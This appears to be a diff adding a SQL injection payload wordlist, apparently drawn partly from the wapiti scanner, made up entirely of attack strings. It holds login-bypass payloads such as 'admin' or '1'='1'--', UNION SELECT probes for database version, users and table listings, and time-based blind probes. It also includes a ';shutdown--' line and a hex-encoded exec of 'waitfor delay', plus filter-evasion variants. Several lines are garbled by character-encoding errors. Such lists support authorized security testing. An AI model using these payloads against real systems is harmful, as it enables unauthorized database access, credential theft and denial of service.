@@ -1,0 +1,414 @@
+ and 1=1
+ and 1=1–
+ like '%'
+ or 0=0 --
+ or 0=0 –
+ or 0=0 #
+ or 1=1
+ or 1=1--
+ or 1=1–
+ or 1=1/*
+ or 1=1#
+ or true
+-
+--';
+-1%cf'/**/UnIon/**/SeLect/**/1,1,1/**/as/**/password,1,1,1/**/%23"
+!
+¡® or 1=1 --
+¡® or 3=3 --
+?id=1' and "a"="a"--+
+?id=1' and database()="securtiy"--+
+?id=1' and sleep(2) and "a"="a"--+
+?id=1' and sleep(2) and substring(database(),1,1)="a"--+
+?id=1' and substring(database(),1,1)="a"--+
+?id=1' order by 1 --+
+' --
+' ;
+' '
+' #
+' and '' like '
+' AnD '' like '
+' and '' like ''--
+' and '' like '%
+' aND '' like '%
+' and 'one'='one
+' and 'one'='one–
+' and 'one'='one�?' group by password having 1=1--
+' and 'x'='x
+' and 1='1
+' AND 1=0 UNION ALL SELECT '', '81dc9bdb52d04dc20036dbd8313ed055
+' and 2>1--
+' and 2>3--
+' and a='a
+' and substring(password/text(),1,1)='7
+' group by password having 1=1--
+' group by userid having 1=1--
+' group by username having 1=1--
+' OORR 1<2 #
+' or         0=0 #
+' or '' '
+' or '' like '
+' or ''-'
+' or ''*'
+' or ''&'
+' or ''^'
+' or ''='
+' or '1'='1
+' or '1'='1'--
+' or '1'='1'/*
+' or '1'='1'#
+' or '1′='1
+' or '1�?'1
+' or 'a'='a
+' or 'one'='one
+' or 'one'='one–
+' or 'one'='one�?' or uid like '%
+' or 'x'='x
+' OR 'x'='x'#;
+' or 0=0 --
+' or 0=0 –
+' or 0=0 #
+' or 0=0 �?" or 0=0 --
+' or 1=1
+' or 1=1 --
+' or 1=1 –
+' or 1=1 limit 1 -- -+
+' or 1=1 LIMIT 1;#
+' or 1=1 �?' or 1=1--
+' or 1=1--
+' or 1=1-- 
+' or 1=1–
+' or 1=1;#
+' or 1=1/*
+' or 1=1#
+' or 1=1�?') or '1'='1
+' or a=a--
+' or a=a–
+' or a=a�?') or ('a'='a
+' or true--
+' or uid like '%
+' or uname like '%
+' or user like '%
+' or userid like '%
+' or username like '%
+' UNION ALL SELECT 1, @@version;#
+' UNION ALL SELECT system_user(),user();#
+' UNION select table_schema,table_name FROM information_Schema.tables;#
+' �?'--
+'-'
+';shutdown--
+'.).or.('.a.'='.a
+'.).or.('.a.'='.a/**/
+''or'='or'
+') and ('x'='x
+') or '1'='1
+') or '1'='1--
+') or '1'='1'--
+') or '1'='1'/*
+') or '1'='1'#
+') or ('1')=('1')-- aassd s
+') or ('1')=('1')#
+') or ('1'='1
+') or ('1'='1--
+') or ('1'='1'--
+') or ('1'='1'/*
+') or ('1'='1'#
+') or ('a'='a
+') or ('a'='a and hi") or ("a"="a
+') or ('x')=('x
+') or ('x'='x
+') or true--
+')) or (('x'))=(('x
+')/**/or/**/('a'='a
+')or('a'='a
+'*'
+'/*
+'/**/or/**/''='
+'/**/or/**/'2'>'1
+'/**/or/**/2>1--/**/
+'/**/or/**/2>1#
+'/**/UnIon/**/SeLect/**/1,1,1/**/from/**/admin/**/Where/**/''='
+'&'
+'#
+'^'
+'+||+1=1#
+'=' 'or' and '=' 'or'
+'=''or'
+'="or'
+'or 1=1
+'OR 1=1
+'or 1=1 or ''='
+'or 1=1--
+'or 1=1-- aassd s
+'or 1=1/*
+'OR 1=1%00
+'or select *
+'or.'a.'='a
+'or' '1'='1'
+'or''='
+'or''=''or''='
+'or'/**/'1'='1'
+'or'='1'
+'or'='or'
+'or'1=1
+'or'1=1′
+'or'1=1�?" or "1"="1
+'or'a'='a
+'or"="a'='a
+'or/**/1=1
+'or/**/1=1--
+'or/**/1=1/*
+'OR/**/1=1%00
+'or1=1--
+'xor
+" --
+" "
+" #
+" AND 1=0 UNION ALL SELECT "", "81dc9bdb52d04dc20036dbd8313ed055
+" or "" "
+" or ""-"
+" or ""*"
+" or ""&"
+" or ""^"
+" or ""="
+" or "1"="1
+" or "1"="1"--
+" or "1"="1"/*
+" or "1"="1"#
+" or "a"="a
+" or "x"="x
+" or 0=0 --
+" or 0=0 -- aassd
+" or 0=0 –
+" or 0=0 #
+" or 0=0 �?%' or '0'='0
+" or 1=1
+" or 1=1 --
+" or 1=1 –
+" or 1=1 or ""="
+" or 1=1 �?" or 1=1--
+" or 1=1--
+" or 1=1-- aassd 
+" or 1=1–
+" or 1=1/*
+" or 1=1#
+" or 1=1�?") or "1"="1
+" or true--
+"-"
+"' or 1 -- aassd'"
+"' or 1 --'"
+") or "1"="1
+") or "1"="1"--
+") or "1"="1"/*
+") or "1"="1"#
+") or ("1"="1
+") or ("1"="1"--
+") or ("1"="1"/*
+") or ("1"="1"#
+") or ("a"="a
+") or ("x")=("x
+") or true--
+")) or (("x"))=(("x
+"*"
+"/*
+"&"
+"^"
+"or "a"="a
+"or 1=1
+"or 1=1 or ""="
+"or 1=1--
+"or 1=1-- aassd
+"or 1=1%00
+"or"="
+"or"="a'='a
+"or/**/1=1--
+"or/**/1=1%00
+"or=or"
+"or1=1--
+) and (1=1
+) or '1′='1–
+) or '1�?'1�?) or ('1�?'1�?' or 1=1 LIMIT 1;#
+) or ('1′='1–
+\x23
+\x27
+\x27\x4F\x52 SELECT *
+\x27\x6F\x72 SELECT *
+\x3D \x27
+\x3D \x3B'
+&lt;&gt;&quot;'%;)(&amp;+
+#
+# from wapiti
+%' or '0'='0
+= --
+= ;
+= '
+0' or '0' = '0
+1
+1 or '1'='1' or 1=1
+1 or '1'='1'=1
+1' or '1' = '1
+1' or substring(password,1,1)='a' or '1'='1
+1'or'1'='1
+1′) and '1′='1–
+1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055
+1234 " AND 1=0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055
+1�? and '1�?'1�?' AND 1=0 UNION ALL SELECT '', '81dc9bdb52d04dc20036dbd8313ed055
+a'or' 1=1--
+a'or' 1=1-- aassd 
+a'or'/**/1=1--
+a'or'1=1--
+admin' --
+admin' -- aassd
+admin’ —
+admin' #
+admin’ #
+admin' and substring(password/text(),1,1)='7
+admin' Or '1'!='1
+admin' or '1'='1
+admin’ or ‘1’=’1
+admin' or '1'='1'--
+admin' or '1'='1'-- aassd
+admin' or '1'='1'/*
+admin’ or ‘1’=’1’/*
+admin' or '1'='1'#
+admin’ or ‘1’=’1’#
+admin’ or ‘1’=’1′–
+admin' or 1=1
+admin’ or 1=1
+admin' or 1=1--
+admin' or 1=1-- aassd
+admin’ or 1=1–
+admin' or 1=1;-- 
+admin' or 1=1/*
+admin’ or 1=1/*
+admin' or 1=1#
+admin’ or 1=1#
+admin'--
+admin'--/**/
+admin') or '1'='1
+admin’) or ‘1’=’1
+admin') or '1'='1'--
+admin') or '1'='1'-- aassd
+admin') or '1'='1'/*
+admin’) or ‘1’=’1’/*
+admin') or '1'='1'#
+admin’) or ‘1’=’1’#
+admin’) or ‘1’=’1′–
+admin') or ('1'='1
+admin’) or (‘1’=’1
+admin') or ('1'='1'--
+admin') or ('1'='1'-- aassd
+admin’) or (‘1’=’1’–
+admin') or ('1'='1'/*
+admin’) or (‘1’=’1’/*
+admin') or ('1'='1'#
+admin’) or (‘1’=’1’#
+admin'/*
+admin’/*
+admin'/**/and/**/2/**/BeTween/**/1/**/and/**/3--/**/
+admin'/**/and/**/2/**/BeTween/**/1/**/and/**/3#
+admin'/**/or/**/'1'='1
+admin'/**/or/**/1=1--/**/
+admin'/**/or/**/1=1#
+admin'#
+admin'or 1=1 or ''='
+admin’or 1=1 or ”=’
+admin" --
+admin" -- aassd
+admin" #
+admin" Or "1"!="2
+admin" or "1"="1
+admin" or "1"="1"--
+admin" or "1"="1"-- aassd
+admin" or "1"="1"/*
+admin" or "1"="1"#
+admin” or “1”=”1″–
+admin” or “1”=”1″/*
+admin” or “1”=”1″#
+admin" or 1=1
+admin” or 1=1
+admin" or 1=1--
+admin" or 1=1-- aassd
+admin” or 1=1–
+admin" or 1=1/*
+admin” or 1=1/*
+admin" or 1=1#
+admin” or 1=1#
+admin") or "1"="1
+admin”) or “1”=”1
+admin") or "1"="1"--
+admin") or "1"="1"-- aassd
+admin") or "1"="1"/*
+admin") or "1"="1"#
+admin”) or “1”=”1″–
+admin”) or “1”=”1″/*
+admin”) or “1”=”1″#
+admin") or ("1"="1
+admin") or ("1"="1"--
+admin") or ("1"="1"-- aassd 
+admin") or ("1"="1"/*
+admin") or ("1"="1"#
+admin”) or (“1″=”1
+admin”) or (“1″=”1”–
+admin”) or (“1″=”1″/*
+admin”) or (“1″=”1″#
+admin"/*
+admin"or 1=1 or ""="
+admin”or 1=1 or “”=”
+and 1=1
+and 1=1�?' and 'one'='one
+declare @s varchar(200) select @s = 0x77616974666F722064656C61792027303A303A31302700 exec(@s) 
+hi" or "a"="a
+hi" or 1=1 --
+hi") or ("a"="a
+like '%'
+or ''='
+or '1'='1
+or '1'='1'--
+or '7659'='7659
+or 'a'='a
+or 'a'='a'
+or 'something' = 'some'+'thing'
+or 'text' = n'text'
+or 'text' > 't'
+or 'unusual' = 'unusual'
+or 'whatever' in ('whatever')
+or ""a""=""a"
+or (EXISTS)
+or 0=0 --
+or 0=0 #
+or 0=0 #"
+or 0=0 �?' or         0=0 #
+or 1 --'
+or 1 in (select @@version)--
+or 1/*
+or 1=1
+or 1=1 /*
+or 1=1 or ''='
+or 1=1 or ""=
+or 1=1--
+or 1=1-- 
+or 1=1-- aassd
+or 1=1--"
+or 1=1–
+or 1=1/*
+or 1=1#
+or 1=1�?' or 1=1--
+or 2 > 1
+or 2 between 1 and 3
+or 3=3
+or a = a
+or a=a
+or a=a--
+or true
+or true--
+or""="""
+or/**/'a'='a'
+or/**/=/*
+or/**/1=1--
+or/**/a"="a
+or="a'='a
+or=or"""
+or1=1--
+ý or 1=1 --
+ý or 3=3 --
